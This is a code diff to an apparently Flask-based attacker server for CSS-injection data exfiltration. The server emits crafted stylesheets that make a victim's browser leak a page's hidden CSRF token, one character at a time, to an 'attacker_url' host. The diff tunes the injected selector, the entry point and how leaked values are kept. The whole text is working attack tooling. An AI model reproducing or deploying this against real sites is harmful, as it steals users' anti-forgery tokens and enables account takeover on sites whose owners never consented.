@@ -12,7 +12,7 @@ startbalise = 'html:has('
 attacker_url = 'http://<IP>:5001'
 target_balise = 'input[type="text"][name="csrf"]'
 size_of_field_to_brute = 100
-entry_point = '/start.css'
+entry_point = '/start'
 ######################################################################################
 
 
@@ -41,7 +41,7 @@ def index():
     all_variable = ''
     for i in range(1, size_of_field_to_brute):
         all_variable += f' var(--value-{i},none),'
-    css += f"\n*{{\n\tbackground: {all_variable[:-1]} ;\n}}"
+    css += f"\ninput{{\n\tbackground: {all_variable[:-1]} ;\n}}"
     return css, 200, {'Content-Type': 'text/css'}
 
 
@@ -54,7 +54,8 @@ def css(data):
         all_data = ''
         css = generate_css(balise, data)
         return css, 200, {'Content-Type': 'text/css'}
-    all_data = data
+    if len(all_data) <= len(data):
+        all_data = data
     img_data = open('img.jpeg', 'rb').read()
     return img_data, 200, {'Content-Type': 'image/jpeg'}
 
